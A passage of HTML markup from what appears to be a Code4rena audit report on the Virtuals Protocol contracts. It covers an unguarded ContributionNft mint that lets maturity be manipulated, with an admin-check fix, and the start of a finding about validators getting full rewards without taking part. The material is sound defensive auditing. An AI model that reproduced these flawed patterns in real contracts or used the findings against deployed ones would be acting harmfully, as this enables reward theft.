.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003col start=\"3\"\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/AgentDAO.sol#L179\"\u003e\u003ccode\u003eAgentDAO::_calcMaturity\u003c/code\u003e\u003c/a\u003e uses \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L124\"\u003e\u003ccode\u003eContributionNft::getCore\u003c/code\u003e\u003c/a\u003e which would calculate incorrect core allowing to manipulate \u003ccode\u003ecoreService\u003c/code\u003e:\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"20\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_calcMaturity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_agentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_agentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etokenVirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIContributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econtributionNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetCore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);                 \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Hence, calculating incorrect core.\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreService\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetCoreService\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// All services start with 100 maturity\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e100\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreService\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIServiceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eserviceNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetMaturity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecoreService\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIEloCalculator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIAgentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_agentNft\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetEloCalculator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebattleElo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ematurity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"recommended-mitigation-steps-3\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-3\" aria-label=\"recommended mitigation steps 3 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eDue to lack of documentation, from my personal understanding the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L33\"\u003ecomment\u003c/a\u003e helps in inferring that the function was meant to be guarded:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"21\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eprivate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_admin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Admin is able to create contribution proposal without votes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eAllowing only an operator or admin to call the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ContributionNft.sol#L65\"\u003e\u003ccode\u003eContributionNft::mint\u003c/code\u003e\u003c/a\u003e should mitigate the issue:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"22\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003erequire(_msgSender() == _admin, \u0026quot;Only admin can set elo calculator\u0026quot;);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"23\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    function mint(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        address to,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 virtualId,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint8 coreId,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        string memory newTokenURI,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 proposalId,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 parentId,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        bool isModel_,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 datasetId\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) external returns (uint256) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+       require(_msgSender() == _admin, \u0026quot;Only admin can mint tokens\u0026quot;); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        IGovernor personaDAO = getAgentDAO(virtualId);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-05-validatorregistryvalidatorscoregetpastvalidatorscore-allows-validator-to-earn-full-rewards-without-actually-engaging-with-the-protocol\" style=\"position:relative;\"\u003e\u003ca href=\"#h-05-validatorregistryvalidatorscoregetpastvalidatorscore-allows-validator-to-earn-full-rewards-without-actually-engaging-with-the-protocol\" aria-label=\"h 05 validatorregistryvalidatorscoregetpastvalidatorscore allows validator to earn full rewards without actually engaging with the protocol permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-83\"\u003e[H-05] \u003ccode\u003eValidatorRegistry::validatorScore/getPastValidatorScore\u003c/code\u003e allows validator to earn full rewards without actually engaging with the protocol\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-778\"\u003eoakcobalt\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-188\"\u003edanzero\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-775\"\u003eYouCrossTheLineAlfie\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ccode\u003eValidatorRegistry::_initValidatorScore\u003c/code\u003e function initializes new validators with a base score equal to the total number of proposals that have ever existed, allowing validators to earn full rewards without actually participating in the protocol.\u003c/p\u003e\n\u003ch3 id=\"vulnerabilities\" style=\"position:relative;\"\u003e\u003ca href=\"#vulnerabilities\" aria-label=\"vulnerabilities permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eVulnerabilities\u003c/h3\u003e\n\u003cp\u003eWhen a new validator is added via \u003ccode\u003eaddValidator()\u003c/code\u003e, their base score is set to \u003ccode\u003e_getMaxScore(virtualId)\u003c/code\u003e which is implemented as \u003ccode\u003etotalProposals(virtualId)\u003c/code\u003e in AgentNftV2:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_initValidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003einternal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_baseValidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getMaxScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L37\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L37\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003eThis base score is then added to the validator’s actual participation score in the \u003ccode\u003evalidatorScore\u003c/code\u003e and \u003ccode\u003egetPastValidatorScore\u003c/code\u003e functions:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evalidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eview\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003evirtual\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk15\"\u003ereturn\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_baseValidatorScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e][\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] +\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_getScoreOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalidator\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L41\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/virtualPersona/ValidatorRegistry.sol#L41\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPastValidatorScore\u003c/span\u003e\u003cspan 